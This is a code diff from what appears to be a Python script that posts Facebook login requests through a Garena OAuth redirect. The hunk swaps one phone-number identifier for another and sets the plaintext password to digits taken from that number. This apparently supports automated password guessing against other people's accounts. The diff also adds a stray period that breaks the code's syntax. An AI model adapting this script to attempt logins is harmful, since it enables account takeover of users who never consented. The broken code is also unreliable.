@@ -57,18 +57,18 @@ variables_dict = {
         "credential_type": "password",
         "dyi_job_id": "",
         "enc_password": {
-            "sensitive_string_value": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0],'964122')
+            "sensitive_string_value": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0],'99070714')
         },
         "event_request_id": "e42c01d8-3326-4e5b-affe-6a6ee78d21ff",
-        "identifier": "9641229664",
+        "identifier": "9907071441",
         "ig_web_device_id": None,
-        "initial_request_id": "1",
+        "initial_request_id": "1",.
         "lids": None,
         "login_source": "LOGIN",
         "next": "https://www.facebook.com/dialog/oauth?client_id=2036793259884297&redirect_uri=https%3A%2F%2Fauth.garena.com%2Funiversal%2Foauth%2Ffacebook&response_type=token&scope=public_profile%2Cemail%2Cuser_friends%2Cuser_link&state=94e81a8bc7c546639f1bd76c25fe3bd6-platform%3D3%26response_type%3Dcode%26client_id%3D100067%26redirect_uri%3Dhttps%253A%252F%252Fzdauth.garena.com%252Flogin%253Freturn_to%253Dhttps%253A%252F%252Fffsupport.garena.com%252Fhc%252Fen-us&ret=login&fbapp_pres=0&logger_id=86af918c-a25d-49f6-94f0-f090c83ee33e&tp=unspecified",
         "passkey_payload": None,
         "password": {
-            "sensitive_string_value": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0],'964122')
+            "sensitive_string_value": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0],'99070714')
         },
         "persistent": True,
         "query_params": "{\"skip_api_login\":\"1\",\"api_key\":\"2036793259884297\",\"kid_directed_site\":\"0\",\"app_id\":\"2036793259884297\",\"signed_next\":\"1\",\"next\":\"https://www.facebook.com/dialog/oauth?client_id=2036793259884297&redirect_uri=https%3A%2F%2Fauth.garena.com%2Funiversal%2Foauth%2Ffacebook&response_type=token&scope=public_profile%2Cemail%2Cuser_friends%2Cuser_link&state=94e81a8bc7c546639f1bd76c25fe3bd6-platform%3D3%26response_type%3Dcode%26client_id%3D100067%26redirect_uri%3Dhttps%253A%252F%252Fzdauth.garena.com%252Flogin%253Freturn_to%253Dhttps%253A%252F%252Fffsupport.garena.com%252Fhc%252Fen-us&ret=login&fbapp_pres=0&logger_id=86af918c-a25d-49f6-94f0-f090c83ee33e&tp=unspecified\",\"cancel_url\":\"https://auth.garena.com/universal/oauth/facebook?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=94e81a8bc7c546639f1bd76c25fe3bd6-platform%3D3%26response_type%3Dcode%26client_id%3D100067%26redirect_uri%3Dhttps%253A%252F%252Fzdauth.garena.com%252Flogin%253Freturn_to%253Dhttps%253A%252F%252Fffsupport.garena.com%252Fhc%252Fen-us#_=_\",\"display\":\"page\",\"locale\":\"en_GB\",\"pl_dbl\":\"0\",\"is_business_login\":\"0\"}",
